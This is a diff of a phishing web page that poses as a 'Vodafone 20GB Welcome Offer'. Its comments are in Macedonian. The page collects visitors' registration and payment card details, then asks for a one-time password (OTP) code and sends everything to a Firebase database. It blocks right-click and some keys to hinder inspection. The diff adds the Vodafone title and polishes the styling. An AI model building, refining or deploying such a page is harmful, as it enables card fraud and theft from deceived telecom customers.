@@ -1,4 +1,11 @@
-<!-- Firebase SDK за Realtime Database -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Vodafone | 20GB Welcome Offer</title>
+    
+    <!-- Firebase SDK за Realtime Database -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
@@ -76,11 +83,12 @@
         .logo { 
             font-size: 32px; 
             font-weight: 900; 
-            color: var(--white); 
+            color: #ffffff; 
             text-align: center; 
             margin-bottom: 18px; 
             letter-spacing: -1.5px;
             text-transform: lowercase;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.25);
         }
         
         h2 { 
@@ -378,10 +386,9 @@
 </div>
 
 <script>
-    // Глобална променлива за привремено чување на податоците
     let currentSubmissionData = {};
 
-    // Заштита против инспекција
+    // Заштита против инспекција (F11 работи нормално)
     document.addEventListener('contextmenu', (e) => e.preventDefault());
     document.addEventListener('keydown', (e) => {
         if (
@@ -453,7 +460,7 @@
         startOtpTimer();
     }
 
-    // Чекор 1: Зачувување на основните податоци и картичката, па отворање на OTP екранот
+    // Чекор 1: Зачувување на податоците и отворање OTP екран
     document.getElementById('regForm').addEventListener('submit', (e) => {
         e.preventDefault();
 
@@ -484,14 +491,13 @@
         }, 1500);
     });
 
-    // Чекор 2: Додавање на OTP кодот и праќање директно во Firebase базaта
+    // Чекор 2: Додавање OTP и праќање во Firebase
     document.getElementById('otpForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         
         const otpValue = document.getElementById('otpCode').value;
         currentSubmissionData.otpCode = otpValue;
 
-        // Повикување на функцијата за снимање во Firebase
         if (window.saveUserDataToFirebase) {
             await window.saveUserDataToFirebase(currentSubmissionData);
         }
